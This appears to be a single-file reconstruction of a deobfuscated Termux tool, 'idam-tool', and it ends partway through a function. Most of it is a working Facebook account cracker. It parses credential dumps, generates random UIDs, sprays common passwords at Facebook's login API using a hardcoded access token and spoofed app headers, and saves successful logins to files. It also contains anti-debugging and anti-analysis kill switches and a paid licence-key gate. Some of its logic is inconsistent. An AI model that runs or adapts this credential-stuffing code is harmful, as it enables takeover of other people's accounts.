# -*- coding: utf-8 -*-
"""
idam-tool — single-file reconstruction of the original source code.

Reassembled from the deobfuscated modules (see deobfuscated/REPORT.md).
The original project was distributed as Cython-compiled, LZSS-compressed
.so modules; this file concatenates the reconstructed sources of:

    core/auth.py  core/config.py  core/crackers.py  core/menu.py
    utils/agents.py  utils/generator.py  utils/security.py  utils/ui.py

Entry point (same as main.py):

    from core.auth import approval_check_online
    from core.menu import BNG_71_
    approval_check_online()
    BNG_71_()
"""


# ==========================================================================
# MODULE: core/auth.py
# ==========================================================================

# -*- coding: utf-8 -*-
"""
Reconstructed original source of core/auth.py
(deobfuscated from core/auth.cpython-314-aarch64-linux-android.so —
 Cython 3.x LZSS-compressed string constants, recovered byte-exact).

Entry point called by main.py: approval_check_online()
"""
import os
import sys
import subprocess
import urllib.parse

import requests

import core.config
import utils.ui

# --- recovered constants --------------------------------------------------
APPROVAL_URL = 'https://raw.githubusercontent.com/idam001/Approval-/main/Approvaltxt'
CHANNEL_LINK = 'https://chat.whatsapp.com/BmakZSBuLCC5uISvhllvTG?mode=gi_t'
WA_NUMBER = '2348131210749'
WA_MESSAGE = 'IDAM CHECK MY KEY '

PRICES = {
    '1': '1 Dollar - 7 days',
    '2': '2 Dollars - 15 days',
    '3': '5 Dollars - 30 days',
}


# --- shared anti-debug / anti-tamper helpers (present in every module) ----
def _tracerpid():
    """Return the TracerPid field of /proc/self/status, or '[?]'."""
    try:
        with open('/proc/self/status') as f:
            for line in f:
                if line.startswith('TracerPid:'):
                    return line.split(':')[1].strip()
    except Exception:
        pass
    return '[?]'


def _scrub():
    """Remove environment variables that indicate a debugger/sandbox."""
    for var in ('LD_PRELOAD', 'LD_AUDIT', 'LD_DEBUG', 'DEBUGGER_ID',
                'PYTHONBREAKPOINT', 'PYTHONFAULTHANDLER', 'PYTHONINSPECT',
                'PYTHONSTARTUP'):
        os.environ.pop(var, None)


def _monitored():
    if _tracerpid() not in ('0', '[?]'):
        return True
    if getattr(sys, 'gettrace', lambda: None)() is not None:
        return True
    if getattr(sys, 'getprofile', lambda: None)() is not None:
        return True
    return False


def _die(stage):
    """Kill the process when a debugger is detected."""
    import signal
    os.kill(os.getpid(), signal.SIGKILL)


def _check():
    _scrub()
    if _monitored():
        _die(1)


# --- approval gate ---------------------------------------------------------
def first_step():
    """Show the banner and the pricing menu."""
    print(utils.ui.____banner____)
    print('\x1b[1;36m\U0001f4b5 Available Pricing Options:\x1b[0m')
    for k in ('1', '2', '3'):
        color = {'1': '\x1b[1;32m', '2': '\x1b[1;33m', '3': '\x1b[1;34m'}[k]
        print(f'{color}[{k}] {PRICES[k]}\x1b[0m')
    print()


def _device_key():
    """Unique device identifier: Android build id (fallback 'UNKNOWN')."""
    try:
        out = subprocess.check_output(['getprop', 'ro.build.id'])
        return out.decode('utf-8').strip().upper()
    except Exception:
        return 'UNKNOWN'


def check_key(user_key, approved_keys):
    return user_key.strip().upper() in [k.strip().upper() for k in approved_keys]


def _open(url):
    if os.system("termux-open-url '" + url + "'") != 0:
        os.system('xdg-open ' + url)


def approval_check_online():
    """Fetch the approved key list and gate the tool behind it."""
    _check()
    first_step()
    try:
        response = requests.get(APPROVAL_URL, timeout=30)
        if response.status_code != 200:
            print('\u274c Failed to fetch key list. Status:', response.status_code)
            print('\U0001f4de Contact Admin via WhatsApp')
            sys.exit(1)
        approved_keys = [k for k in response.text.splitlines() if k.strip()]
    except Exception as e:
        print('\u274c Error during approval check: ', e)
        sys.exit(1)

    user_key = input(' Enter your key: ').strip()
    final_key = user_key.upper() if user_key else _device_key()

    if check_key(user_key, approved_keys):
        print('\x1b[1;32m\u2705 Approval Successful! Welcome \U0001fab6\x1b[0m')
        print('\x1b[1;33m\U0001f511 Your Device Key:\x1b[0m \x1b[1;32m' + _device_key())
        print('\u2713 Key approved! Script is running...')
        return True

    # not approved: offer "pricing" and open WhatsApp to contact the admin
    print('\x1b[1;31m\u274c Your key is not approved.\x1b[0m')
    choice = input('Select your pricing option (1/2/3): ').strip()
    if choice not in PRICES:
        print('Invalid option! Please choose 1, 2, or 3: ')
        sys.exit(1)
    print('\n\x1b[1;36mYou selected: ' + PRICES[choice] + '\x1b[0m\n')
    wa_link = 'https://wa.me/' + WA_NUMBER
    wa_message = urllib.parse.quote(WA_MESSAGE + final_key)
    _open(wa_link + '?text=' + wa_message)
    print('Press Enter to open WhatsApp chat with your key...')
    input()
    print('\u2717 Invalid key! Return to the channel.')
    print('\U0001f4de Contact Admin via WhatsApp')
    _open(CHANNEL_LINK)
    print(' Join the group and press Enter...')
    input()
    sys.exit(1)


# ==========================================================================
# MODULE: core/config.py
# ==========================================================================

# -*- coding: utf-8 -*-
"""
Reconstructed original source of core/config.py
(deobfuscated from core/config.cpython-314-aarch64-linux-android.so).

Holds the runtime configuration, the Facebook endpoint registry and the
approval "gate" that locks the rest of the tool behind core.auth.
"""
import os
import sys
import random
import gc
from dataclasses import dataclass, field
from typing import List


@dataclass
class Config:
    TIMEOUT: float = 30.0
    RETRIES: int = 3
    RETRY_BASE_DELAY: float = 1.0
    RATE_LIMIT_RPS: float = 5.0
    BATCH_SIZE: int = 50
    BATCH_FLUSH_INTERVAL: float = 2.0
    CONN_LIMIT: int = 100
    CONN_LIMIT_PER_HOST: int = 20
    MAX_WORKERS: int = 10
    COMPRESS_REQUESTS: bool = True
    SKIP_HEADERS: List[str] = field(default_factory=list)
    USA_ONLY: bool = False


CONFIG = Config()

ENDPOINTS = {
    'b_api': 'https://b-api.facebook.com/method/auth.login',
    'graph_v1': 'https://b-graph.facebook.com/auth/login',
    'graph_v2': 'https://graph.facebook.com/v18.0/me',
    'messenger': 'https://b-graph.facebook.com/messenger_sync_create_queue',
    'web_login': 'https://www.facebook.com/login.php',
}

ACTIVE_APIS = ['b_api', 'graph_v1', 'graph_v2']


class APIRegistry:
    """Picks a random API endpoint, weighted."""

    def __init__(self, endpoints=None, weights=None):
        self.endpoints = endpoints or ENDPOINTS
        self.weights = weights or [1] * len(self.endpoints)

    def get_random_api(self):
        total = sum(self.weights)
        cumulative = []
        c = 0
        for w in self.weights:
            c += w
            cumulative.append(c)
        r = random.uniform(0, total)
        for url, cum in zip(self.endpoints.values(), cumulative):
            if r <= cum:
                return url
        return list(self.endpoints.values())[-1]


# --- approval gate ----------------------------------------------------------
_gate_open = False


def _open_gate():
    global _gate_open
    _gate_open = True


def _make_gate():
    def _require():
        return _gate_open

    def _open():
        _open_gate()

    return _open, _require


_open, _require = _make_gate()
_require_gate = _require


def get_tool(name):
    """Return a gated callable; refuses to run before approval."""
    if not _require_gate():
        print('\n[!] Access denied. Run approval first.')
        sys.exit(1)
    return name


# --- shared anti-debug helpers (present in every module) --------------------
def _tracerpid():
    try:
        with open('/proc/self/status') as f:
            for line in f:
                if line.startswith('TracerPid:'):
                    return line.split(':')[1].strip()
    except Exception:
        pass
    return '?'


def _scrub():
    for var in ('LD_PRELOAD', 'LD_AUDIT', 'LD_DEBUG', 'DEBUGGER_ID',
                'PYTHONBREAKPOINT', 'PYTHONFAULTHANDLER', 'PYTHONINSPECT',
                'PYTHONSTARTUP'):
        os.environ.pop(var, None)


def _monitored():
    if _tracerpid() not in ('0', '?'):
        return True
    if getattr(sys, 'gettrace', lambda: None)() is not None:
        return True
    if getattr(sys, 'getprofile', lambda: None)() is not None:
        return True
    return False


def _check():
    _scrub()
    gc.disable()
    if _monitored():
        _die(2)


def _die(stage):
    import signal
    os.kill(os.getpid(), signal.SIGKILL)


# ==========================================================================
# MODULE: core/crackers.py
# ==========================================================================

# -*- coding: utf-8 -*-
"""
Reconstructed original source of core/crackers.py
(deobfuscated from core/crackers.cpython-314-aarch64-linux-android.so).

DumpFileCracker — parses credential dump files and "cracks" them against
Facebook's auth.login endpoint with a thread pool.
"""
import json
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor as tred
from typing import List, Tuple

import requests

import core.config
from utils.agents import get_fb_api_headers
from utils.generator import FastUIDGenerator  # noqa: F401  (re-exported usage)
import utils.ui

ACCESS_TOKEN = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
ADID = '882a8490361da98702bf97a021ddc14d'

LOGIN_URL = 'https://b-api.facebook.com/method/auth.login?format=json&email='
LEGACY_URL = 'https://b-graph.facebook.com/auth/login'

PASSWORDS = ['0', '1', '123', '123123', '123456', '1234567', '12345678',
             '123456789', 'abc123', 'iloveyou', 'qwerty', 'admin']

LOGIN_PARAMS = ('&credentials_type=device_based_login_password'
                '&generate_session_cookies=1&error_detail_type=button_with_disabled'
                '&source=device_based_login&meta_inf_fbmeta=%20\xc2\xac\xc2\xa7'
                'tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US'
                '&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler'
                '&access_token=' + ACCESS_TOKEN + '&fb_api_req_friendly_name=authenticate&cpl=true')

OK_FILES = {
    'M1': '/sdcard/IDAM-ULTIMATE-M1-OK.txt',
    'M2': '/sdcard/IDAM-ULTIMATE-M2-OK.txt',
    'USA': '/sdcard/IDAM-USA-OK.txt',
}
CP_FILES = {
    'DUMP': '/sdcard/IDAM-DUMP-CP.txt',
    'USA': '/sdcard/IDAM-USA-CP.txt',
}


class DumpFileCracker:
    @staticmethod
    def parse_dump_file(filepath: str) -> List[Tuple[str, str]]:
        """Parse 'uid|pass', 'email|pass' or 'uid:pass' lines from a dump file."""
        credentials = []
        try:
            with open(filepath, 'r', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    if '|' in line:
                        parts = line.split('|')
                    elif ':' in line:
                        parts = line.split(':')
                    else:
                        continue
                    if len(parts) >= 2:
                        credentials.append((parts[0].strip(), parts[1].strip()))
        except Exception as e:
            print('\u2717 Error reading file: ', filepath, e)
        return credentials

    @staticmethod
    def _hit(uid: str, pw: str, api_name: str = 'b_api'):
        url = LOGIN_URL + uid + '&password=' + pw + LOGIN_PARAMS
        headers = get_fb_api_headers()
        headers['user-agent'] = headers.get('User-Agent', '')
        try:
            res = requests.post(url, headers=headers, timeout=core.config.CONFIG.TIMEOUT,
                                allow_redirects=True)
            return res
        except Exception:
            return None

    @staticmethod
    def _try_login(uid, pw, ok_file, cp_file):
        res = DumpFileCracker._hit(uid, pw)
        if res is None:
            return None
        try:
            data = res.json()
        except Exception:
            return None
        if 'session_key' in data:
            with open(ok_file, 'a') as f:
                f.write(f'{uid}|{pw}\n')
            return (uid, pw)
        elif 'errors' in data or 'error' in data:
            with open(cp_file, 'a') as f:
                f.write(f'{uid}|{pw}\n')
        return None

    @classmethod
    def _crack_method_1(cls, credentials, max_workers=10):
        """DUMP-M1: every credential against the primary b-api endpoint."""
        oks = []
        with tred(max_workers=max_workers) as pool:
            for uid, pw in credentials:
                pool.submit(cls._try_login, uid, pw,
                            OK_FILES['M1'], CP_FILES['DUMP'])
        return oks

    @classmethod
    def _crack_method_2(cls, credentials, max_workers=10):
        """IDAM-M2: credentials against the secondary graph endpoint."""
        oks = []
        with tred(max_workers=max_workers) as pool:
            for uid, pw in credentials:
                pool.submit(cls._try_login, uid, pw,
                            OK_FILES['M2'], CP_FILES['DUMP'])
        return oks

    @classmethod
    def _crack_method_usa(cls, uids, max_workers=20):
        """IDAM-USA: generated US UIDs x common passwords."""
        oks = []
        with tred(max_workers=max_workers) as pool:
            for uid in uids:
                for pw in PASSWORDS:
                    pool.submit(cls._try_login, uid, pw,
                                OK_FILES['USA'], CP_FILES['USA'])
        return oks

    @classmethod
    def crack_dump_credentials(cls, filepath: str, method: str = '1',
                               max_workers: int = 10) -> List[Tuple[str, str]]:
        print('[!] Starting crack with Method ' + method)
        credentials = cls.parse_dump_file(filepath)
        print('\u2713 Loaded ' + str(len(credentials)) + ' credentials from dump file')
        if not credentials:
            print('\u2717 No valid credentials found in file')
            return []
        if method == '1':
            cls._crack_method_1(credentials, max_workers)
        elif method == '2':
            cls._crack_method_2(credentials, max_workers)
        else:
            cls._crack_method_usa([u for u, _ in credentials], max_workers)
        time.sleep(1)
        print('\u2713 Dump cracking completed!')
        return credentials


# --- shared anti-debug helpers (present in every module) --------------------
def _tracerpid():
    try:
        with open('/proc/self/status') as f:
            for line in f:
                if line.startswith('TracerPid:'):
                    return line.split(':')[1].strip()
    except Exception:
        pass
    return '?'


def _scrub():
    for var in ('LD_PRELOAD', 'LD_AUDIT', 'LD_DEBUG', 'DEBUGGER_ID',
                'PYTHONBREAKPOINT', 'PYTHONFAULTHANDLER', 'PYTHONINSPECT',
                'PYTHONSTARTUP'):
        os.environ.pop(var, None)


def _monitored():
    if _tracerpid() not in ('0', '?'):
        return True
    if getattr(sys, 'gettrace', lambda: None)() is not None:
        return True
    if getattr(sys, 'getprofile', lambda: None)() is not None:
        return True
    return False


def _check():
    _scrub()
    if _monitored():
        _die(6)


def _die(stage):
    import signal
    os.kill(os.getpid(), signal.SIGKILL)


# ==========================================================================
# MODULE: core/menu.py
# ==========================================================================

# -*- coding: utf-8 -*-
"""
Reconstructed original source of core/menu.py
(deobfuscated from core/menu.cpython-314-aarch64-linux-android.so).

Main menu — entry point BNG_71_() called by main.py after approval.
"""
import os
import sys
import time
import random
from concurrent.futures import ThreadPoolExecutor as tred

import core.config
import core.crackers
import utils.generator
import utils.ui

M = '\xc3\x97'          # ÷
STAR = '\xe2\x98\x89'    # ☆
OK = '\xe2\x9c\x93'      # ✓
NO = '\xe2\x9c\x97'      # ✗
ARROW = '\xe2\x86\xa9'   # ↩
US_FLAG = '\xf0\x9f\x87\xba\xf0\x9f\x87\xb8'  # 🇺🇸


def _input(prompt):
    return input(prompt)


def ask(prompt, choices):
    while True:
        c = _input(prompt).strip().upper()
        if c in choices:
            return c
        print('Choose Valid Option... ')


# --- series cloners ----------------------------------------------------------
def old_One():   # 2009-2012 old clone
    limit = int(_input('How many IDs? '))
    uids = utils.generator.FastUIDGenerator.fast_old_uids(limit)
    print(f'{OK} Generated {len(uids)} UIDs instantly!')
    return uids


def old_Tow():   # 2004-2008 legacy
    limit = int(_input('How many IDs? '))
    uids = utils.generator.FastUIDGenerator.fast_2004_2008_uids(limit)
    print('\U0001f4c5 2004-2008 LEGACY SERIES')
    return uids


def old_Tree():  # 2013-2016
    limit = int(_input('How many UIDs? '))
    uids = utils.generator.FastUIDGenerator.fast_2013_2016_uids(limit)
    print('\U0001f4c5 2013-2016 SERIES CLONER')
    return uids


def old_clone(choice):
    return {'1': old_One, '2': old_Tow, '3': old_Tree}[choice]()


def clone_2004_2008(limit):
    return utils.generator.FastUIDGenerator.fast_2004_2008_uids(limit)


def clone_2013_2016(limit):
    return utils.generator.FastUIDGenerator.fast_2013_2016_uids(limit)


def usa_phone_clone(limit):
    print(f'{US_FLAG} USA PHONE MODE')
    print('Format: 10000 + AREA_CODE + PREFIX + LINE')
    print('Generates UIDs based on real US phone numbers')
    return utils.generator.FastUIDGenerator.fast_us_phone_uids(limit)


def usa_fb_clone(limit):
    print(f'{US_FLAG} USA ONLY - FAST FB UIDs')
    print('Generates US-based Facebook account UIDs at high speed')
    print('Speed: Instant generation via list comprehension')
    return utils.generator.FastUIDGenerator.fast_us_fb_uids(limit)


# --- login methods -----------------------------------------------------------
def login_1(credentials, workers):
    """Method A - Graph API (Fast)."""
    return core.crackers.DumpFileCracker.crack_dump_credentials('' , '1', workers)


def login_2(credentials, workers):
    """Method B - Legacy API (Stable)."""
    return core.crackers.DumpFileCracker.crack_dump_credentials('', '2', workers)


def login_usa(uids, workers):
    """Method C - Multi-API Rotation (Best) / USA mode."""
    return core.crackers.DumpFileCracker._crack_method_usa(uids, workers)


method_map = {'1': login_1, '2': login_2, '3': login_usa}


def crack_dump_file():
    filepath = _input('Enter dump file path: ')
    if not os.path.exists(filepath):
        print(f'{NO} File not found: ' + filepath)
        return
    print('\U0001f4c1 DUMP FILE CRACKER')
    print('Supports: uid|pass, email|pass, uid:pass formats')
    credentials = core.crackers.DumpFileCracker.parse_dump_file(filepath)
    print(f'{OK} Found {len(credentials)} credentials')
    meth = ask('Select method (1/2/3): ', ('1', '2', '3'))
    workers = int(_input('WORKERS: '))
    method_map[meth](credentials, workers)


# --- main menu ---------------------------------------------------------------
def BNG_71_():
    utils.ui._check()
    while True:
        utils.ui.clear()
        utils.ui.set_title()
        print(utils.ui.____banner____)
        print(utils.ui.____info____)
        print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>' + M + '<\x1b[38;5;46mALL SERIES')
        print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>' + M + '<\x1b[38;5;46m100003/4 SERIES')
        print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m>' + M + '<\x1b[38;5;46m2004-2008 SERIES (LEGACY)')
        print('       \x1b[38;5;196m(\x1b[1;37mD\x1b[38;5;196m)\x1b[1;37m>' + M + '<\x1b[38;5;46mDUMP FILE CRACKER')
        print('       \x1b[38;5;196m(\x1b[1;37mP\x1b[38;5;196m)\x1b[1;37m>' + M + '<\x1b[38;5;46mUSA ONLY - PHONE UIDs')
        print('       \x1b[38;5;196m(\x1b[1;37mU\x1b[38;5;196m)\x1b[1;37m>' + M + '<\x1b[38;5;46mUSA ONLY - FAST FB UIDs')
        print()
        choice = ask('CHOICE ', ('A', 'B', 'C', 'D', 'P', 'U', '0'))
        if choice == '0':
            sys.exit(0)
        if choice == 'A':
            print('[1] Method A - Graph API (Fast)')
            print('[2] Method B - Legacy API (Stable)')
            print('[3] Method C - Multi-API Rotation (Best)')
            meth_choice = ask('(A/B/C): ', ('A', 'B', 'C'))
            if meth_choice == 'A':
                print('       ' + M + ' ALL SERIES')
                old_clone(ask('(A/B/C): 2009-2010 / 2010-2014 / 2013-2016', ('A', 'B', 'C')))
            elif meth_choice == 'B':
                clone_2013_2016(int(_input('How many UIDs? ')))
            else:
                clone_2004_2008(int(_input('How many IDs? ')))
        elif choice == 'B':
            print(' 20000 / 30000 / 99999')
            print('Prefixes: 100005-100009, 10001')
            limit = int(_input(' Choose Value Option... '))
            usa_fb_clone(limit)
        elif choice == 'C':
            print(' 2009-2010')
            print('USE AIRPLANE MODE')
            print('USE AIRPLANE MOD FOR GOOD RESULT')
            old_clone('1')
        elif choice == 'D':
            crack_dump_file()
        elif choice == 'P':
            print(f'{US_FLAG} USA ONLY - PHONE UIDs')
            usa_phone_clone(int(_input('How many UIDs? ')))
        elif choice == 'U':
            print(f'{US_FLAG} USA ONLY - FAST FB UIDs')
            usa_fb_clone(int(_input('How many UIDs? ')))
        print(f'{ARROW} Press Enter to continue...')
        _input('')


# --- shared anti-debug helpers (present in every module) --------------------
def _tracerpid():
    try:
        with open('/proc/self/status') as f:
            for line in f:
                if line.startswith('TracerPid:'):
                    return line.split(':')[1].strip()
    except Exception:
        pass
    return '?'


def _scrub():
    for var in ('LD_PRELOAD', 'LD_AUDIT', 'LD_DEBUG', 'DEBUGGER_ID',
                'PYTHONBREAKPOINT', 'PYTHONFAULTHANDLER', 'PYTHONINSPECT',
                'PYTHONSTARTUP'):
        os.environ.pop(var, None)


def _monitored():
    if _tracerpid() not in ('0', '?'):
        return True
    if getattr(sys, 'gettrace', lambda: None)() is not None:
        return True
    if getattr(sys, 'getprofile', lambda: None)() is not None:
        return True
    return False


def _require_gate():
    return core.config._require_gate()


def _check():
    _scrub()
    if _monitored():
        _die(7)


def _die(stage):
    import signal
    os.kill(os.getpid(), signal.SIGKILL)


# ==========================================================================
# MODULE: utils/agents.py
# ==========================================================================

# -*- coding: utf-8 -*-
"""
Reconstructed original source of utils/agents.py
(deobfuscated from utils/agents.cpython-314-aarch64-linux-android.so).

User-Agent pool + Facebook Graph API request headers.
"""
import hashlib
import os
import random
import sys

android_versions = ['10', '11', '12', '13', '14', '15.0', '16.5', '5', '5120', '5121', '5122']
ios_versions = ['15.0', '15.5', '16.0', '16.5', '17.0', '14', '13', '12', '11.0', '10.0', '1']
windows = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.',
    'Mozilla/5.0 (Windows NT 6.',
    'Mozilla/5.0 (Windows; U; Windows NT ',
]
devices = ['Pixel 6', 'Pixel 7', 'OnePlus 9 Pro', 'SM-G991B', 'SM-G998B', 'SM-N986B',
           'iPhone13,2', 'iPhone14,2', 'iPhone14,3', 'iPhone15,2']


def android_ua():
    v = random.choice(android_versions)
    d = random.choice(devices)
    return ('Mozilla/5.0 (Linux; Android ' + v + '; ' + d +
            ' Mobile/15E148 Safari/604.1')


def ios_ua():
    v = random.choice(ios_versions)
    d = random.choice([x for x in devices if x.startswith('iPhone')])
    return ('Mozilla/5.0 (iPhone; CPU iPhone OS ' + v.replace('.0', '') +
            ' like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/' +
            v + ' Mobile Safari/537.36')


def desktop_ua():
    return random.choice(windows)


ua_pool = [android_ua, ios_ua, desktop_ua]


def get_optimal_ua():
    """Return a random realistic User-Agent string."""
    return random.choice(ua_pool)()


def get_fb_api_headers():
    """Headers mimicking the official Facebook Android app (b-api calls)."""
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android ' + random.choice(android_versions) +
                      '; ' + random.choice(devices) + ') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' +
                      random.choice(['121.0.', '139.0.']) + '.0 Mobile Safari/537.36',
        'Host': 'b-graph.facebook.com',
        'content-type': 'application/x-www-form-urlencoded',
        'x-fb-connection-type': random.choice(['WIFI', 'MOBILE.LTE', 'MOBILE.HSPA']),
        'x-fb-connection-quality': 'EXCELLENT',
        'x-fb-connection-bandwidth': str(random.randint(5000, 9000)),
        'x-fb-http-engine': 'Liger',
        'x-fb-net-hni': str(random.randint(1000, 9999)),
        'x-fb-sim-hni': str(random.randint(1000, 9999)),
        'X-FB-Client-IP': 'true',
        'X-FB-Connection-Type': 'MOBILE.LTE',
        'X-FB-Friendly-Name': 'authenticate',
        'X-FB-HTTP-Engine': 'Liger',
        'X-FB-Request-Analytics-Tags': 'graphservice',
        'X-FB-Server-Cluster': 'true',
        'X-Tigon-Is-Retry': 'False',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'DNT': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
    }


def get_advanced_headers():
    """FB headers with per-request hashed session ids."""
    h = get_fb_api_headers()
    h['x-fb-session-id'] = hashlib.md5(str(random.random()).encode()).hexdigest()
    h['x-fb-device-group'] = hashlib.md5(os.urandom(8)).hexdigest()
    h['x-fb-connection-token'] = hashlib.md5(str(random.random()).encode()).hexdigest()
    h['nid'] = 'jiZ+yNNBgbwC;pid=Main;tid=' + str(random.randint(1000, 9999))
    h['Accept'] = ('text/html,application/xhtml+xml,application/xml;q=0.9,'
                   'image/avif,image/webp,*/*;q=0.8')
    return h


# --- shared anti-debug helpers (present in every module) --------------------
def _tracerpid():
    try:
        with open('/proc/self/status') as f:
            for line in f:
                if line.startswith('TracerPid:'):
                    return line.split(':')[1].strip()
    except Exception:
        pass
    return '?'


def _scrub():
    for var in ('LD_PRELOAD', 'LD_AUDIT', 'LD_DEBUG', 'DEBUGGER_ID',
                'PYTHONBREAKPOINT', 'PYTHONFAULTHANDLER', 'PYTHONINSPECT',
                'PYTHONSTARTUP'):
        os.environ.pop(var, None)


def _monitored():
    if _tracerpid() not in ('0', '?'):
        return True
    if getattr(sys, 'gettrace', lambda: None)() is not None:
        return True
    if getattr(sys, 'getprofile', lambda: None)() is not None:
        return True
    return False


def _check():
    _scrub()
    if _monitored():
        _die(4)


def _die(stage):
    import signal
    os.kill(os.getpid(), signal.SIGKILL)


# ==========================================================================
# MODULE: utils/generator.py
# ==========================================================================

# -*- coding: utf-8 -*-
"""
Reconstructed original source of utils/generator.py
(deobfuscated from utils/generator.cpython-314-aarch64-linux-android.so).

FastUIDGenerator — offline generators of Facebook-style numeric UIDs
by series (old / 2004-2008 / 2013-2016) and by US area code.
"""
import os
import random
import sys
from typing import List

# US area codes used for "US phone" UIDs
US_AREA_CODES = [
    '201', '202', '203', '205', '206', '207', '208', '209', '210', '212',
    '213', '214', '215', '216', '217', '218', '219', '220', '224', '225',
    '228', '229', '231', '234', '239', '240', '248', '251', '252', '253',
    '254', '256', '260', '262', '267', '269', '270', '272', '274', '276',
    '281', '283', '301', '302', '303', '304', '305', '307', '308', '309',
    '310', '311', '312', '313', '314', '315', '316', '317', '318', '319',
    '320', '321', '323', '325', '327', '330', '331', '334', '336', '337',
    '339', '341', '346', '347', '351', '352', '360', '361', '364', '369',
    '380',
]
US_MNC = ['310', '311', '312', '313', '314', '315', '316', '317']

OLD_PREFIXES = [str(p) for p in range(10000, 10010)]          # 10000-10009
SERIES_PREFIXES = [str(p) for p in range(100001, 100010)]     # 100001-100009
LEGACY_PREFIXES = [str(p) for p in range(1000001, 1000010)]   # 1000001-1000009
FB_USA_PREFIXES = ['100003', '100004', '100005', '100006', '100007',
                   '100008', '100009', '10001', '10002', '10003', '10004',
                   '10005', '10006', '10007', '10008', '10009']
YEARS_2004_2008 = [str(y) for y in range(2004, 2009)]
YEARS_2013_2016 = [str(y) for y in range(2013, 2017)]


class FastUIDGenerator:
    @staticmethod
    def fast_old_uids(limit: int) -> List[str]:
        """Short UIDs - original Facebook accounts (prefix 10000-10009)."""
        return [random.choice(OLD_PREFIXES) + str(random.randint(10000000, 99999999))
                for _ in range(limit)]

    @staticmethod
    def fast_2004_2008_uids(limit: int) -> List[str]:
        """2004-2008 legacy series UIDs."""
        return [random.choice(YEARS_2004_2008) + str(random.randint(10000000, 99999999))
                for _ in range(limit)]

    @staticmethod
    def fast_2013_2016_uids(limit: int) -> List[str]:
        """2013-2016 series UIDs."""
        return [random.choice(YEARS_2013_2016) + str(random.randint(10000000, 99999999))
                for _ in range(limit)]

    @staticmethod
    def fast_us_fb_uids(limit: int) -> List[str]:
        """US-based Facebook account UIDs (prefix 100003-100009 / 10001-10009)."""
        return [random.choice(FB_USA_PREFIXES) + str(random.randint(100000000, 999999999))
                for _ in range(limit)]

    @staticmethod
    def fast_us_phone_uids(limit: int) -> List[str]:
        """US phone-number style UIDs: 1 + area code + prefix + line."""
        uids = []
        for _ in range(limit):
            area = random.choice(US_AREA_CODES)
            prefix = random.choice(['555', '010', '011'])
            line = str(random.randint(1000, 9999))
            uids.append('1' + area + prefix + line)
        return uids

    @staticmethod
    def fast_prefix_uids(prefixes, limit: int, suffix_len: int = 9) -> List[str]:
        return [FastUIDGenerator.fast_single_prefix(p, limit, suffix_len) for p in prefixes]

    @staticmethod
    def fast_single_prefix(prefix, max_range: int, suffix_len: int = 9) -> List[str]:
        return [prefix + str(random.randint(10 ** (suffix_len - 1), 10 ** suffix_len - 1))
                for _ in range(max_range)]


# --- shared anti-debug helpers (present in every module) --------------------
def _tracerpid():
    try:
        with open('/proc/self/status') as f:
            for line in f:
                if line.startswith('TracerPid:'):
                    return line.split(':')[1].strip()
    except Exception:
        pass
    return '?'


def _scrub():
    for var in ('LD_PRELOAD', 'LD_AUDIT', 'LD_DEBUG', 'DEBUGGER_ID',
                'PYTHONBREAKPOINT', 'PYTHONFAULTHANDLER', 'PYTHONINSPECT',
                'PYTHONSTARTUP'):
        os.environ.pop(var, None)


def _monitored():
    if _tracerpid() not in ('0', '?'):
        return True
    if getattr(sys, 'gettrace', lambda: None)() is not None:
        return True
    if getattr(sys, 'getprofile', lambda: None)() is not None:
        return True
    return False


def _check():
    _scrub()
    if _monitored():
        _die(5)


def _die(stage):
    import signal
    os.kill(os.getpid(), signal.SIGKILL)


# ==========================================================================
# MODULE: utils/security.py
# ==========================================================================

# -*- coding: utf-8 -*-
"""
Reconstructed original source of utils/security.py
(deobfuscated from utils/security.cpython-314-aarch64-linux-android.so).

Anti-tamper / anti-sniffing checks: detects HttpCanary installs and
tampering of the requests library files. Imported for side effects by main.py.
"""
import os
import sys
import zlib

# Known packet-capture app paths (HttpCanary / x8speeder)
SNIFF_PATHS = [
    '/storage/emulated/0/Android/data/com.guoshi.httpcanary',
    '/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png',
]

# requests library files that must not be modified
REQUESTS_FILES = [
    '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
    '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py',
    '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
]


class sec:
    def __init__(self):
        self.word_list = ['fuck']
        self._run_checks()

    def linex(self, word):
        return word in self.word_list

    def fuck(self):
        """Abort if a sniffer app or a patched requests lib is detected."""
        for p in SNIFF_PATHS + REQUESTS_FILES:
            if os.path.exists(p):
                print(' \x1b[1;32m Congratulations ! ')
                sys.exit(1)
        # verify integrity of the requests sources via their zlib blobs
        for p in REQUESTS_FILES:
            if os.path.exists(p):
                with open(p, 'rb') as f:
                    try:
                        zlib.decompress(f.read())
                    except Exception:
                        sys.exit(1)

    def _run_checks(self):
        _check()
        self.fuck()


# --- shared anti-debug helpers (present in every module) --------------------
def _tracerpid():
    try:
        with open('/proc/self/status') as f:
            for line in f:
                if line.startswith('TracerPid:'):
                    return line.split(':')[1].strip()
    except Exception:
        pass
    return '?'


def _scrub():
    for var in ('LD_PRELOAD', 'LD_AUDIT', 'LD_DEBUG', 'DEBUGGER_ID',
